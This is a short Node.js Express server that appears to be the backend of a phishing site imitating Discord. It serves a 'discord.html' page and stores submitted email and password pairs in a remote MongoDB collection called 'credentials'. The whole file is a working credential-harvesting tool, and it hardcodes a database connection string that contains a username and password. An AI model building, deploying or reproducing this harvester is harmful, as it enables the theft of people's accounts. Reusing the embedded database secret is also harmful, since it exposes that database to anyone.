const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const path = require("path");

const app = express();
const port = 4200;

app.use(bodyParser.json());
app.use(express.static("public"));

const uri =
	"mongodb+srv://copy:copyakcord@credentials.pxrplms.mongodb.net/?retryWrites=true&w=majority&appName=credentials";

mongoose.set("strictQuery", true);
mongoose.connect(uri);

const credentials = new mongoose.Schema({
	email: String,
	password: String,
});

const DataModel = mongoose.model("credentials", credentials);

const rateLimitStore = {};

const rateLimiter = (req, res, next) => {
	const userIP = req.ip;
	const currentTime = Date.now();
	const lastRequestTime = rateLimitStore[userIP];

	if (lastRequestTime && currentTime - lastRequestTime < 6000) {
		return res
			.status(429)
			.send("Too many requests. Please wait a minute before trying again.");
	}

	rateLimitStore[userIP] = currentTime;
	next();
};
app.post("/save-data", rateLimiter, async (req, res) => {
	try {
		const data = new DataModel(req.body);
		await data.save();
		res.send("Data saved successfully");
	} catch (err) {
		console.error("Error saving data to MongoDB:", err);
		res.status(500).send("Error saving data");
	}
});

app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "public", "discord.html"));
});

app.get("/C33492870921051D9974E798392441E2.txt", (req,res)=> {
	res.sendFile(path.join(__dirname, "C33492870921051D9974E798392441E2.txt"));
});

app.listen(port, () => {
	console.log(`✅ Server is running on http://localhost:${port}`);
});
